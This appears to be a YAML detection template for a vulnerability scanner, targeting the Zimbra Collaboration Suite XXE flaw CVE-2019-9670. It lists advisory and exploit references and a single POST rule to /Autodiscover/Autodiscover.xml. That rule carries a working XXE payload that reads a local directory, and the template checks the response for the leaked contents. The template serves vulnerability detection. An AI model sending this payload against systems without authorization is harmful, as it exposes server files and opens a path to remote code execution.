name: yaml-poc-synacor-zimbra_collaboration_suite-logical-CVE-2019-9670
binding: ac3b5a58-e008-4478-b873-d34fbe17a964
detail:
    author: system_user
    links:
        - http/zimbra_xxe_rce
        - http://packetstormsecurity.com/files/152487/Zimbra-Collaboration-Autodiscover-Servlet-XXE-ProxyServlet-SSRF.html
        - http://www.rapid7.com/db/modules/exploit/linux/
        - http://www.rapid7.com/db/modules/exploit/linux/http/zimbra_xxe_rce
        - https://bugzilla.zimbra.com/show_bug.cgi?id=109129
        - https://isc.sans.edu/forums/diary/CVE20199670+Zimbra+Collaboration+Suite+XXE+vulnerability/27570/
        - https://nvd.nist.gov/vuln/detail/CVE-2019-9670
        - https://packetstormsecurity.com/files/152487/Zimbra-Collaboration-Autodiscover-Servlet-XXE-ProxyServlet-SSRF.html
        - https://wiki.zimbra.com/wiki/Zimbra_Security_Advisories
        - https://www.exploit-db.com/exploits/46693
        - https://www.exploit-db.com/exploits/46693/
    vulnerability:
        id: 3eba99d7-300b-44f0-b544-acebbc53288a
        level: critical
transport: http
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /Autodiscover/Autodiscover.xml
            headers:
                Content-Type: text/xml
            body: <!DOCTYPE xxe [<!ELEMENT name ANY ><!ENTITY xxe SYSTEM "file:./" >]><Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a"><Request><EMailAddress>test@test.com</EMailAddress><AcceptableResponseSchema>&xxe;</AcceptableResponseSchema></Request></Autodiscover>
            follow_redirects: false
        expression: response.body.bcontains(b"zmmailboxd.out") && response.body.bcontains(b"Requested response schema not available")
expression: r0()
